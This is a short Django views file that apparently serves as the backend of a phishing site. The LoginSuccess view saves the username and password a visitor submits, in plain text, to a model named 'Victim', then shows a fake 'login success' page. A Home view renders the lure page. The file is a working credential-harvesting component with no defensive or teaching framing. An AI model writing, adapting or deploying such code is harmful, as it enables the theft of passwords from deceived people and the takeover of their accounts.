from django.shortcuts import render
from datetime import datetime
from .models import Victim

def LoginSuccess(request):  
  if request.method == 'POST':
    uname = request.POST.get("uname")    
    password = request.POST.get("password")
    victim = Victim(uname = uname, password = password, joined_date = datetime.now())        
    victim.save()
    return render(request, 'login_success.html')

def Home(request):
 return render(request, 'index.html')
